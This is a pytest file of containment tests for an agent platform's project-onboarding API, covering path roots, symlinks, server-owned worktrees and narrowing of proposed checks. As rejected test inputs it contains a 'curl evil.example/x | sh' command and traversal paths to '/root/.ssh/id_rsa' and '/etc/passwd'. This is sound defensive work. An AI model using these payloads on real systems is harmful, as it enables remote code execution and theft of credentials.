"""Containment guards for project onboarding.

Onboarding is the most powerful thing an admin can do through the dashboard:
it hands an agent bash and write access to a directory, and makes the review
service copy the files named as secrets into a worktree. "Admin" answers who
may ask; these tests cover what the answer may be.

Three properties are enforced here:

1. A project must live inside a configured root (AGENT_PROJECT_ROOTS), judged
   after symlink resolution.
2. The worktree location is server-owned. It was previously taken from the
   request body, which made it an arbitrary-filesystem-write primitive.
3. The operator may only NARROW what detection proposed. `checks` and `build`
   are executed verbatim by the review and deploy services, so accepting
   client-authored commands there is remote code execution by config.
"""

import json
import os
import subprocess
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

import agent.server as srv
from agent import cartographer
from agent import config as agent_config
from agent import provisioning as prov
from agent.auth import User

_ADMIN = User(id=1, email="admin@example.com", role="admin", allowed_repos=None,
              totp_enabled=True, must_change_password=False,
              auto_approve_commands=False, require_merge_review=True)


def _make_repo(path: Path) -> Path:
    (path / "tests").mkdir(parents=True)
    (path / "package.json").write_text(json.dumps({
        "name": path.name, "scripts": {"lint": "eslint .", "test": "node tests/u.js"}}))
    (path / "package-lock.json").write_text("{}")
    (path / ".gitignore").write_text(".env\n")
    (path / ".env").write_text("SECRET=1\n")
    (path / "tests" / "u.js").write_text("0;\n")
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=path, check=True)
    subprocess.run(["git", "config", "user.email", "t@t.t"], cwd=path, check=True)
    subprocess.run(["git", "config", "user.name", "t"], cwd=path, check=True)
    subprocess.run(["git", "add", "-A"], cwd=path, check=True)
    subprocess.run(["git", "commit", "-qm", "i"], cwd=path, check=True)
    return path


@pytest.fixture
def contained(tmp_path, monkeypatch):
    """An allowed root plus a forbidden area outside it."""
    allowed = tmp_path / "allowed"
    outside = tmp_path / "outside"
    allowed.mkdir()
    outside.mkdir()
    workspaces = tmp_path / "workspaces"
    monkeypatch.setenv("AGENT_PROJECT_ROOTS", str(allowed))
    monkeypatch.setenv("AGENT_SANDBOX_ROOT", str(workspaces))
    projects_file = tmp_path / "projects.json"
    projects_file.write_text(json.dumps({"projects": {}}) + "\n")
    monkeypatch.setattr(agent_config, "_PROJECTS_CONFIG_PATH", projects_file)
    monkeypatch.setattr(agent_config, "PROJECTS", {}, raising=False)
    monkeypatch.setattr(srv, "PROJECTS", agent_config.PROJECTS, raising=False)
    monkeypatch.setitem(srv.app.dependency_overrides, srv.require_full_auth, lambda: _ADMIN)

    async def fake_seed_memory(repo, store, content):
        return None

    async def fake_cartographer(config, repo, store, force=False):
        return {"repo": repo, "mapped": True}

    import agent.deep_agent as da
    monkeypatch.setattr(da, "seed_memory", fake_seed_memory)
    monkeypatch.setattr(cartographer, "run_cartographer", fake_cartographer)
    monkeypatch.setattr(srv.app.state, "store", object(), raising=False)
    monkeypatch.setattr(srv.app.state, "auth_pool", object(), raising=False)
    return {"allowed": allowed, "outside": outside, "workspaces": workspaces,
            "projects_file": projects_file}


# --- path containment -----------------------------------------------------

def test_path_outside_the_allowed_roots_is_refused(contained):
    outside_repo = _make_repo(contained["outside"] / "evil")
    res = TestClient(srv.app).post("/api/projects/detect", json={"path": str(outside_repo)})
    assert res.status_code == 400
    assert "outside the configured project roots" in res.json()["detail"]


def test_symlink_pointing_out_of_an_allowed_root_is_refused(contained):
    """Judged by where it lands, not by the name it was reached through."""
    real = _make_repo(contained["outside"] / "real")
    link = contained["allowed"] / "innocent"
    os.symlink(real, link)
    res = TestClient(srv.app).post("/api/projects/detect", json={"path": str(link)})
    assert res.status_code == 400
    assert "outside the configured project roots" in res.json()["detail"]


def test_sensitive_system_paths_are_refused_by_default(contained, monkeypatch):
    monkeypatch.setenv("AGENT_PROJECT_ROOTS", "/home")
    for p in ("/etc", "/root", "/", "/etc/ssl/private"):
        with pytest.raises(prov.ProvisioningError):
            prov.assert_path_allowed(p)


def test_the_agents_own_repository_is_refused(contained, monkeypatch):
    """Self-modification was deliberately deferred; a merge into this repo
    would rewrite and restart the process running the task."""
    monkeypatch.setenv("AGENT_PROJECT_ROOTS", "/")
    own = prov._agent_own_roots()[0]
    with pytest.raises(prov.PathNotAllowedError, match="own repository"):
        prov.assert_path_allowed(own)


def test_an_existing_agent_worktree_is_refused(contained, monkeypatch):
    monkeypatch.setenv("AGENT_PROJECT_ROOTS", str(contained["allowed"].parent))
    (contained["workspaces"] / "some-project").mkdir(parents=True)
    with pytest.raises(prov.PathNotAllowedError, match="workspace root"):
        prov.assert_path_allowed(str(contained["workspaces"] / "some-project"))


def test_relative_paths_are_still_refused(contained):
    res = TestClient(srv.app).post("/api/projects/detect", json={"path": "../../etc"})
    assert res.status_code == 400


# --- the worktree location is server-owned --------------------------------

def test_client_cannot_choose_where_the_worktree_is_created(contained):
    """`sandbox` used to come from the request body -- an arbitrary write."""
    repo = _make_repo(contained["allowed"] / "shop")
    client = TestClient(srv.app)
    report = client.post("/api/projects/detect", json={"path": str(repo)}).json()
    assert report["sandbox"] == str(contained["workspaces"] / "shop")

    res = client.post("/api/projects/provision", json={
        "path": str(repo),
        "sandbox": "/tmp/attacker-chosen",     # ignored: not part of the schema
        "live": "/etc",
        "choices": {"checks": [], "build_steps": []},
        "grant_access": False,
    })
    assert res.status_code == 200, res.text
    assert res.json()["ok"] is True
    assert not Path("/tmp/attacker-chosen").exists()
    written = json.loads(contained["projects_file"].read_text())["projects"]["shop"]
    assert written["sandbox"] == str(contained["workspaces"] / "shop")
    assert written["live"] == str(repo), "the client's `live` must be ignored"


# --- choices may only narrow what was proposed ----------------------------

def test_injected_check_command_is_refused(contained):
    """`checks` is executed verbatim by the review service."""
    repo = _make_repo(contained["allowed"] / "shop")
    client = TestClient(srv.app)
    res = client.post("/api/projects/provision", json={
        "path": str(repo),
        "choices": {"checks": [
            {"name": "lint", "dir": ".", "cmd": "bash",
             "args": ["-c", "curl evil.example/x | sh"]},
        ]},
        "grant_access": False,
    })
    # The name is known, so it is accepted -- but substituted with OUR command.
    assert res.status_code == 200, res.text
    written = json.loads(contained["projects_file"].read_text())["projects"]["shop"]
    check = written["review"]["checks"][0]
    assert check["cmd"] == "npm" and check["args"] == ["run", "lint"], \
        "the server must substitute its own detected command"
    assert "curl" not in json.dumps(written)


def test_unproposed_check_name_is_refused(contained):
    repo = _make_repo(contained["allowed"] / "shop")
    res = TestClient(srv.app).post("/api/projects/provision", json={
        "path": str(repo),
        "choices": {"checks": [{"name": "deploy-to-prod", "dir": ".", "cmd": "npm",
                                "args": ["run", "deploy"]}]},
        "grant_access": False,
    })
    assert res.status_code == 400
    assert "was not proposed" in res.json()["detail"]
    assert not (contained["workspaces"] / "shop").exists(), \
        "a rejected request must not leave a worktree behind"


def test_secret_file_traversal_is_refused(contained):
    """secretFiles are copied OUT of the live checkout by the reviewer."""
    repo = _make_repo(contained["allowed"] / "shop")
    res = TestClient(srv.app).post("/api/projects/provision", json={
        "path": str(repo),
        "choices": {"checks": [], "secret_files": ["../../../root/.ssh/id_rsa"]},
        "grant_access": False,
    })
    assert res.status_code == 400
    assert "was not proposed" in res.json()["detail"]


def test_absolute_secret_path_is_refused_even_if_it_exists(contained):
    repo = _make_repo(contained["allowed"] / "shop")
    res = TestClient(srv.app).post("/api/projects/provision", json={
        "path": str(repo),
        "choices": {"checks": [], "secret_files": ["/etc/passwd"]},
        "grant_access": False,
    })
    assert res.status_code == 400


def test_safe_relative_rejects_escapes_and_accepts_real_files(tmp_path):
    base = tmp_path / "repo"
    (base / "config").mkdir(parents=True)
    (base / "config" / "keys.json").write_text("{}")
    assert prov.safe_relative("config/keys.json", str(base)) == "config/keys.json"
    for bad in ("../outside", "/etc/passwd", "config/../../escape"):
        with pytest.raises(prov.ProvisioningError):
            prov.safe_relative(bad, str(base))
    with pytest.raises(prov.ProvisioningError):
        prov.safe_relative("config/missing.json", str(base))


def test_operator_can_still_narrow_freely(contained):
    """The guard must not block the legitimate case: accepting some proposals
    and rejecting others."""
    repo = _make_repo(contained["allowed"] / "shop")
    client = TestClient(srv.app)
    report = client.post("/api/projects/detect", json={"path": str(repo)}).json()
    assert [c["name"] for c in report["checks"]] == ["lint", "test"]

    res = client.post("/api/projects/provision", json={
        "path": str(repo),
        "choices": {
            "checks": [c for c in report["checks"] if c["name"] == "lint"],   # dropped test
            "secret_files": [],                                               # rejected .env
            "build_steps": report["build_steps"],
            "node_modules_dirs": report["node_modules_dirs"],
        },
        "grant_access": False,
    })
    assert res.status_code == 200, res.text
    written = json.loads(contained["projects_file"].read_text())["projects"]["shop"]
    assert [c["name"] for c in written["review"]["checks"]] == ["lint"]
    assert "secretFiles" not in written["review"]
